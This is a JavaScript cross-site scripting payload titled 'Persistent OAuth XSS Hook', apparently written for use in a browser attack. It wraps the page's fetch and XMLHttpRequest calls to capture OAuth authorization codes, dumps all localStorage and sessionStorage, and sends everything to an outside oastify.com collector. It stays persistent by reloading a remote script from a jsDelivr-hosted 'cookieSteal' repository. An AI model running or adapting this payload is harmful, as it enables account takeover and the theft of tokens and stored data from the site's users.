// =====================
// Persistent OAuth XSS Hook
// =====================

// Collector URL
let COLLECT = 'https://85bhvmhm5bs8d86f2rd5lsxwxn3erafz.oastify.com/collect';

// Exfil function
function exfil(name, data){
    try {
        new Image().src = COLLECT+'?k='+encodeURIComponent(name)+'&v='+encodeURIComponent(data).slice(0,2000);
    } catch(e){}
}

// Step 0: reinject on page load if hook already installed
if(localStorage.getItem('hook_installed')){
    if(!window.hookActive){
        var s = document.createElement('script');
        s.src = 'https://cdn.jsdelivr.net/gh/justblock6/cookieSteal@main/maybestealV5.js';
        document.body.appendChild(s);
    }
}

// Step 1: main hook logic
(function(){
    if(window.hookActive) return;
    window.hookActive = true;

    localStorage.setItem('hook_installed','1');

    // --- Hook fetch ---
    const _fetch = window.fetch;
    window.fetch = function(input, init){
        return _fetch.apply(this, arguments).then(async res=>{
            try{
                const r = res.clone();
                const ct = r.headers.get('content-type')||'';
                if(ct.includes('application/json') || ct.includes('text/')){
                    const t = await r.text().catch(()=> '');
                    const m = t.match(/code=(\d{6,})/);
                    if(m) exfil('oauth_code', m[1]);
                }
            }catch(e){}
            return res;
        });
    };

    // --- Hook XHR ---
    const _open = XMLHttpRequest.prototype.open;
    const _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method,url){
        this._hook_url = url;
        return _open.apply(this,arguments);
    };
    XMLHttpRequest.prototype.send = function(body){
        this.addEventListener('load', ()=>{
            try{
                const ct = this.getResponseHeader && this.getResponseHeader('content-type')||'';
                if(ct.includes('application/json') || ct.includes('text/')){
                    const m = this.responseText.match(/code=(\d{6,})/);
                    if(m) exfil('oauth_code', m[1]);
                }
            }catch(e){}
        });
        return _send.apply(this,arguments);
    };

    // Optional: dump local/session storage
    try {
        Object.keys(localStorage||{}).forEach(k=> exfil('ls_'+k, localStorage.getItem(k)));
        Object.keys(sessionStorage||{}).forEach(k=> exfil('ss_'+k, sessionStorage.getItem(k)));
    } catch(e){}

    // Confirm hook installed
    exfil('xss_hook','installed');

})();
